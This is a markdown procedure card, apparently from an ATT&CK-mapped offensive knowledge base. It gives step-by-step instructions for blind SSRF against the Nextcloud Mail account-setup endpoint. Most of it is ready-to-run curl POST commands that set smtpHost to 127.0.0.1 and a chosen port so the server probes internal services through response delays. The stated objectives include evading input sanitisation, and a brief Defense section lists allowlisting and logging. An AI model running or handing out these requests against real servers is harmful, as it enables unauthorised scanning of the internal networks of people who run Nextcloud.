---
id: proc-ssrf-trigger-nextcloud-1746582
tags:
  - ssrf
  - smtp
  - post-request
type: procedure
tools:
  - '[[tools/curl]]'
tactics:
  - '[[Discovery]]'
commands:
  - '[[commands/curl-post-mail-setup]]'
verified: false
platforms:
  - Web
submitted: true
created_at: '2023-10-01T00:00:00Z'
techniques:
  - '[[Network Service Scanning]]'
updated_at: '2025-12-14T04:39:09.837Z'
skill_level: intermediate
impact_level: medium
detection_risk: medium
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Discovery]]'
mitre_techniques:
  - '[[Network Service Scanning]]'
---
# Send-SSRF-POST-Request-via-smtpHost

## Summary

This procedure sends a POST request to the Nextcloud Mail account setup endpoint, setting smtpHost to an arbitrary internal address like 127.0.0.1 to trigger SSRF during SMTP validation.

## Description

The vulnerability stems from unvalidated user input in smtpHost, allowing the server to attempt connections to internal hosts. Combined with valid IMAP, this forces the Nextcloud server to connect to specified ports on localhost or internal IPs, enabling blind exploitation.

## Requirements

1. Valid IMAP configuration from prior step
2. Authenticated session cookie or API token
3. Target port for probing (e.g., 8080)

## Defense

Defensive measures and detection strategies:

- Validate and allowlist smtpHost to external domains only
- Disable direct SMTP connections in Mail app or use proxies
- Log all outbound connections from app servers

## Objectives

1. Force server-side connection to internal host/port
2. Trigger timeout-based side channel for detection
3. Avoid input sanitization blocks

## Instructions

### Step 1: Craft SSRF Payload

**Context**: Include malicious smtpHost in the JSON payload.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -X POST -H "OCS-APIRequest: true" -H "Content-Type: application/json" -d '{"imapHost":"ssl0.ovh.net","imapPort":993,"imapSslMode":"ssl","imapUser":"user","imapPassword":"pass","smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none","smtpUser":"user","smtpPassword":"pass"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Submits payload targeting localhost:8080. Expected output: Delayed response if port open, due to connection attempt.

### Step 2: Authenticate Request

**Context**: Ensure request is authenticated to access endpoint.

**Command** ([[commands/curl-post-mail-setup]]):
```bash
curl -X POST -H "OCS-APIRequest: true" -H "Cookie: nc_session=your_session" -H "Content-Type: application/json" -d '{"smtpHost":"127.0.0.1","smtpPort":8080,"smtpSslMode":"none"}' https://nextcloud.example.com/ocs/v2.php/apps/mail/api/v1/accounts
```

> Adds session cookie. Expected output: 200 OK after SMTP timeout.

## MITRE ATT&CK Mapping

### Tactics

- [[Discovery]] Discovery

### Techniques

- [[Network Service Scanning]] Network Service Scanning

### Sub-Techniques


## Commands Used

- [[commands/curl-post-mail-setup]]

## Tools Used

- [[tools/curl]]

## Tags

- ssrf
- smtp
- post-request
